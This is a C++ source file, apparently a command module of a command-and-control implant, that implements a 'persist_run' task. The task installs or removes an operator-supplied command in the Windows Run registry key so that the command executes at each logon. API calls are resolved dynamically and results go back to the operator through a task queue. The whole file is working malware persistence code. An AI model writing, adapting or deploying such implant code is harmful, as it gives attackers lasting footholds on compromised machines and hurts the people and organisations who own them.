#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PERSIST_RUN

using namespace stardust;
using namespace starburst;

typedef LSTATUS (WINAPI *fn_RegDeleteValueA)( HKEY, LPCSTR );

auto declfn starburst::cmd_persist_run(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action_str = parser_string( params, &action_len );
    uint32_t name_len = 0;
    auto name_str = parser_string( params, &name_len );
    uint32_t command_len = 0;
    auto command_str = parser_string( params, &command_len );
    uint8_t hkcu = parser_byte( params );

    if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
        return;
    }

    char action_buf[16] = { 0 };
    memory::copy( action_buf, action_str, action_len < 15 ? action_len : 15 );
    char name_buf[256] = { 0 };
    memory::copy( name_buf, name_str, name_len < 255 ? name_len : 255 );
    char command_buf[512] = { 0 };
    if ( command_str && command_len > 0 )
        memory::copy( command_buf, command_str, command_len < 511 ? command_len : 511 );

    HKEY hive = hkcu ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;

    char run_key[64] = { 0 };
    str_copy( run_key, symbol<char*>( const_cast<char*>(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ) ) );

    bool is_install = str_cmp( action_buf,
        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;

    if ( is_install ) {
        if ( !command_str || command_len == 0 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "install requires command" ) ) );
            return;
        }

        HKEY h_key = nullptr;
        LSTATUS status = inst.advapi32.RegOpenKeyExA(
            hive, run_key, 0, KEY_SET_VALUE, &h_key );
        if ( status != ERROR_SUCCESS ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
            return;
        }

        uint32_t cmd_total_len = str_len( command_buf ) + 1;
        status = inst.advapi32.RegSetValueExA(
            h_key, name_buf, 0, REG_SZ,
            reinterpret_cast<const BYTE*>( command_buf ), cmd_total_len );
        inst.advapi32.RegCloseKey( h_key );

        if ( status == ERROR_SUCCESS ) {
            char out[320] = { 0 };
            str_copy( out, symbol<char*>( const_cast<char*>(
                "Installed run key: " ) ) );
            uint32_t off = str_len( out );
            memory::copy( out + off, name_buf, str_len( name_buf ) );
            queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegSetValueExA failed" ) ) );
        }
    } else {
        // remove
        HKEY h_key = nullptr;
        LSTATUS status = inst.advapi32.RegOpenKeyExA(
            hive, run_key, 0, KEY_SET_VALUE, &h_key );
        if ( status != ERROR_SUCCESS ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
            return;
        }

        auto pRegDeleteValueA = reinterpret_cast<fn_RegDeleteValueA>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.advapi32.handle,
                symbol<LPCSTR>( "RegDeleteValueA" ) ) );
        if ( !pRegDeleteValueA ) {
            inst.advapi32.RegCloseKey( h_key );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteValueA not found" ) ) );
            return;
        }

        status = pRegDeleteValueA( h_key, name_buf );
        inst.advapi32.RegCloseKey( h_key );

        if ( status == ERROR_SUCCESS ) {
            char out[320] = { 0 };
            str_copy( out, symbol<char*>( const_cast<char*>(
                "Removed run key: " ) ) );
            uint32_t off = str_len( out );
            memory::copy( out + off, name_buf, str_len( name_buf ) );
            queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "RegDeleteValueA failed" ) ) );
        }
    }
}

#endif
